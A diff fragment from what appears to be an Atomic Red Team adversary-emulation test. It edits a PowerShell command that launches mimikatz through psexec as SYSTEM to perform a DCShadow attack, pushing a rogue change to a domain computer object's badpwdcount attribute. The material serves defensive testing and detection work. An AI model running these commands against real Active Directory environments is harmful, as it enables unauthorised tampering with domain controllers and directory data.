@@ -33,7 +33,7 @@ atomic_tests:
     command: |
       $mimikatzParam ="`"log #{output_file}`" `"lsadump::dcshadow /object:#{machine}$ /attribute:badpwdcount /value=9999`" `"exit`""
       $mimikatzParam2 ="`"lsadump::dcshadow /push`" `"exit`""
-      Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/k #{psexec_path} -i -s #{mimikatz_path} $mimikatzParam"
+      Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"
       Start-Sleep -Seconds 5
       Start-Process -FilePath '#{mimikatz_path}' -Verb Runas -ArgumentList "$mimikatzParam2"
 
